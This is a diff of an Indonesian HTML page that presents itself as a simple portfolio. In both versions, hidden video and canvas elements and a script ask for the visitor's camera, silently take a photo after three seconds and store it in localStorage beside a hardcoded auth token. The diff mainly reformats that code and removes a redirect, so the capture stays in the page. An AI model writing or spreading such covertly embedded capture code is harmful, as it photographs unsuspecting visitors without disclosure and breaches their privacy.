@@ -1,4 +1,5 @@
-<!DOCTYPE html><html lang="id">
+<!DOCTYPE html>
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -20,33 +21,32 @@
 </head>
 <body>
     <h1>Selamat Datang di Portfolio</h1>
-    <p>Ini adalah halaman portfolio sederhana.</p><video id="video" autoplay style="display: none;"></video>
-<canvas id="canvas" style="display: none;"></canvas>
+    <p>Ini adalah halaman portfolio sederhana.</p>
 
-<script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
+    <video id="video" autoplay style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-            video.srcObject = stream;
-            setTimeout(() => { // Ambil foto otomatis setelah 3 detik
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                const imageData = canvas.toDataURL('image/png');
-                localStorage.setItem('capturedImage', imageData);
-                localStorage.setItem('authToken', 'secure123'); // Token akses
-                
-                window.location.href = 'result.html';
-            }, 3000);
-        })
-        .catch(err => {
-            console.error("Akses kamera ditolak", err);
-        });
-</script>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
 
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                setTimeout(() => { 
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    const imageData = canvas.toDataURL('image/png');
+                    localStorage.setItem('capturedImage', imageData);
+                    localStorage.setItem('authToken', 'secure123'); 
+                }, 3000); 
+            })
+            .catch(err => {
+                console.error("Akses kamera ditolak", err);
+            });
+    </script>
 </body>
 </html>
